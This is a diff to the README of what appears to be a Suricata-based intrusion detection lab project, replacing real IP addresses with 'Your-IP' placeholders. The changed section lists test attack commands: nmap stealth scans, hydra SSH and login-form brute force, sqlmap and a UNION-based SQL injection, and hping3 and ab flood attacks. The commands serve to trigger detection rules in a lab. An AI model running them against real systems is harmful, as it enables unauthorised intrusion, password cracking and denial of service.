@@ -222,7 +222,7 @@ All configuration is done via the `.env` file. Key settings:
 ```env
 SECRET_KEY=your-secret-key-here
 DEBUG=True
-ALLOWED_HOSTS=127.0.0.1,localhost,10.114.98.28
+ALLOWED_HOSTS=127.0.0.1,localhost,Your-IP
 ```
 
 ### Kafka
@@ -238,7 +238,7 @@ KAFKA_ENABLE_AUTO_COMMIT=True
 ### Suricata SSH Sync
 
 ```env
-SURICATA_SSH_HOST=192.168.1.50
+SURICATA_SSH_HOST=Your-IP
 SURICATA_SSH_PORT=22
 SURICATA_SSH_KEY_PATH=/home/kali/.ssh/suricata_key
 SURICATA_REMOTE_RULES_DIR=/etc/suricata/rules
@@ -352,7 +352,7 @@ This project was tested against a local vulnerable Django web application on the
 
 ```
 Phone (Termux attacker)  ─┐
-                           ├──► 10.114.98.28:4444  (Vulnerable web app)
+                           ├──► Your-IP:4444  (Vulnerable web app)
 Kali Linux (attacker)    ─┘         │
                                     │
                               Suricata (monitoring)
@@ -364,36 +364,36 @@ Kali Linux (attacker)    ─┘         │
 
 **Nmap Scans (SID 1000001–1000006)**
 ```bash
-sudo nmap -sS 10.114.98.28 -p 1-1000          # SYN stealth scan
-sudo nmap -sN 10.114.98.28                    # NULL scan
-sudo nmap -sX 10.114.98.28                    # XMAS scan
-sudo nmap -sF 10.114.98.28                    # FIN scan
-nmap -T5 --open 10.114.98.28 -p-              # Port sweep
+sudo nmap -sS Your-IP -p 1-1000          # SYN stealth scan
+sudo nmap -sN Your-IP                    # NULL scan
+sudo nmap -sX Your-IP                    # XMAS scan
+sudo nmap -sF Your-IP                    # FIN scan
+nmap -T5 --open Your-IP -p-              # Port sweep
 ```
 
 **SSH Brute Force (SID 1000007–1000009)**
 ```bash
-hydra -l root -P /usr/share/wordlists/rockyou.txt 10.114.98.28 ssh -t 4 -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt Your-IP ssh -t 4 -V
 ```
 
 **SQL Injection (SID 1000012–1000014)**
 ```bash
-sqlmap -u "http://10.114.98.28:4444/search/?q=1" --dbs --batch
-curl "http://10.114.98.28:4444/login/?id=1'+UNION+SELECT+1,2,3--"
+sqlmap -u "http://Your-IP:4444/search/?q=1" --dbs --batch
+curl "http://Your-IP:4444/login/?id=1'+UNION+SELECT+1,2,3--"
 ```
 
 **DoS / Flood (SID 1000023–1000026)**
 ```bash
-sudo hping3 -S --flood -p 4444 10.114.98.28   # SYN flood
-sudo hping3 --icmp --flood 10.114.98.28       # ICMP flood
-ab -n 5000 -c 100 http://10.114.98.28:4444/   # HTTP flood
+sudo hping3 -S --flood -p 4444 Your-IP   # SYN flood
+sudo hping3 --icmp --flood Your-IP       # ICMP flood
+ab -n 5000 -c 100 http://Your-IP:4444/   # HTTP flood
 ```
 
 **From Termux (Android):**
 ```bash
 pkg install nmap hydra python apache2-utils
-nmap -sV 10.114.98.28 -p 4444,22,23
-hydra -l admin -P ~/wordlist.txt 10.114.98.28 -s 4444 http-post-form "/login/:username=^USER^&password=^PASS^:F=Invalid"
+nmap -sV Your-IP -p 4444,22,23
+hydra -l admin -P ~/wordlist.txt Your-IP -s 4444 http-post-form "/login/:username=^USER^&password=^PASS^:F=Invalid"
 ```
 
 ---
